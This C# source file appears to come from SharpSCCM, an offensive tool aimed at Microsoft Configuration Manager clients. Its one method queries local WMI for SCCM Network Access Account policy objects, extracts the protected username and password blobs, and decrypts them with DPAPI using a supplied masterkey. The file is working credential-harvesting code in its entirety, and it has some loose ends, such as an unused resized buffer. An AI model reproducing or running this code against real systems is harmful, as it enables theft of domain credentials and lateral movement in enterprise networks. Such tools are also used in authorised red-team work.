using System;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.CommandLine.NamingConventionBinder;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging;
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;



namespace SharpSCCM
{
    public class Credentials
    {

        static void LocalNetworkAccessAccounts(string masterkey)
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
            NewSccmConnection();
            GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
            ManagementObjectCollection accounts = searcher.Get();
            if (accounts.Count > 0)
            {
                foreach (ManagementObject account in accounts)
                {
                    string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                    string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                    byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                    int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                    Array.Resize(ref protectedUsernameBytes, length);
                    try
                    {

                        Dpapi.Execute(protectedUsername, masterkey);
                        Dpapi.Execute(protectedPassword, masterkey);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            else
            {
                Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
            }
        }
    }
}